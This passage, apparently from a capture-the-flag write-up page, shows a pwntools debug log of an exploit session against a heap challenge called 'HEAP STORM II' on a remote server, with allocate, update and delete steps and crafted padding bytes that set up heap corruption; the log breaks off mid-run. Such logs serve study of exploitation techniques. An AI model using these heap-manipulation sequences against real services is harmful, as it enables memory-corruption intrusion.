class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 202.120.7.205 on port 5655: Done</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;0NrK7lj7hzsvZNOW&apos;</span><br><span class="line">[DEBUG] Received 0x1 bytes:</span><br><span class="line">    &apos;\n&apos;</span><br><span class="line">0NrK7lj7hzsvZNOW</span><br><span class="line">[DEBUG] Sent 0x4 bytes:</span><br><span class="line">    00000000  01 31 ef d8                                         │·1··││</span><br><span class="line">    00000004</span><br><span class="line">[DEBUG] Received 0xf6 bytes:</span><br><span class="line">    &apos;    __ __ _____________   __   __    ___    ____\n&apos;</span><br><span class="line">    &apos;   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n&apos;</span><br><span class="line">    &apos;  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\n&apos;</span><br><span class="line">    &apos; / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n&apos;</span><br><span class="line">    &apos;/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n&apos;</span><br><span class="line">[DEBUG] Received 0x54 bytes:</span><br><span class="line">    &apos;\n&apos;</span><br><span class="line">    &apos;===== HEAP STORM II =====\n&apos;</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 0 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1288\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 1 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 2 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1272\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x4f8 bytes:</span><br><span class="line">    00000000  68 68 68 68  68 68 68 68  68 68 68 68  68 68 68 68  │hhhh│hhhh│hhhh│hhhh│</span><br><span class="line">    *</span><br><span class="line">    000004f0  00 05 00 00  00 00 00 00                            │····│····││</span><br><span class="line">    000004f8</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 1 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 3 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1288\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 4 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 5 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;4\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1272\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x4f8 bytes:</span><br><span class="line">    00000000  68 68 68 68  68 68 68 68  68 68 68 68  68 68 68 68  │hhhh│hhhh│hhhh│hhhh│</span><br><span class="line">    *</span><br><span class="line">    000004f0  00 05 00 00  00 00 00 00                            │····│····││</span><br><span class="line">    000004f8</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 4 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 6 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 1 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;0\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;12\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0xc bytes:</span><br><span class="line">    &apos;h&apos; * 0xc</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 0 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 1 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1240\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 7 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 1 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 2 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    